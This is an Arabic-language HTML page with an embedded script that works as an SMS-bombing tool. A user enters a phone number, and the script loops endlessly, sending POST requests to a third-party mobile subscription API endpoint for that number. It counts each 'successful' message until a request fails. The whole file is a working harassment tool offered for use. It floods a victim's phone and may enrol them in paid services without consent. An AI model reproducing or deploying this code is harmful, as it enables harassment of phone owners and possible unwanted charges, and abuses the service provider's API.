<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>إرسال الرسائل</title>
<style>
* {
box-sizing: border-box;
margin: 0;
padding: 0;
font-family: Arial, sans-serif;
}
body {
display: flex;
justify-content: center;
align-items: center;
min-height: 100vh;
background: linear-gradient(135deg, #4b6cb7, #182848);
color: #fff;
}
.container {
background-color: rgba(255, 255, 255, 0.1);
padding: 30px;
border-radius: 8px;
width: 350px;
text-align: center;
box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
}
h2 {
font-size: 24px;
margin-bottom: 20px;
}
input[type="text"] {
width: 100%;
padding: 12px;
margin-top: 10px;
margin-bottom: 20px;
border: none;
border-radius: 5px;
background-color: rgba(255, 255, 255, 0.2);
color: #fff;
text-align: center;
font-size: 16px;
outline: none;
}
button {
width: 100%;
padding: 12px;
font-size: 16px;
font-weight: bold;
color: #182848;
background-color: #4b6cb7;
border: none;
border-radius: 5px;
cursor: pointer;
transition: background-color 0.3s ease;
}
button:hover {
background-color: #395391;
}
.status {
margin-top: 20px;
font-size: 16px;
}
</style>
</head>
<body>
<div class="container">
<h2>إرسال رسالة</h2>
<input type="text" id="phone" placeholder="أدخل رقم الهاتف (مثال: 770...)" />
<button onclick="sendMessages()">إرسال</button>
<div id="status" class="status">عدد الرسائل المرسلة: 0</div>
</div>

<script>
async function sendMessages() {
let phone = document.getElementById("phone").value;
let sent = 0;
document.getElementById("status").innerText = "الرسائل قيد الإرسال...";

while (true) {
try {
let response = await fetch("https://vas2.grand-hub.com/api/ludo/asiacell-d/subscribe", {
method: "POST",
headers: {
"Content-Type": "application/json"
},
body: JSON.stringify({ phone: phone })
});
let result = await response.json();

if (result.message.includes("successfully")) {
sent++;
document.getElementById("status").innerText = `تم إرسال الرسالة بنجاح | العدد: ${sent}`;
} else {
document.getElementById("status").innerText = `خطأ في إرسال الرسالة | العدد: ${sent}`;
break;
}
} catch (error) {
document.getElementById("status").innerText = `حدث خطأ: ${error.message}`;
break;
}
}
}
</script>
</body>
</html>
